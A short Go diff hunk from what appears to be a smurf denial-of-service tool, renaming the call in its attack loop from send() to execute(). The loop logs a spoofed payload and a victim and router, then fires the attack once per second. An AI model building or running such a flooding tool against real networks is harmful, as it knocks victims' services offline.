@@ -19,7 +19,7 @@ func main() {
 	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
 	for {
 		log.Printf("[smurf] victim (%s), with router (%s)", victim.String(), router.String())
-		if err := s.send(); err != nil {
+		if err := s.execute(); err != nil {
 			log.Printf("[smurf] error: %s", err)
 		}
 		time.Sleep(time.Second * 1)
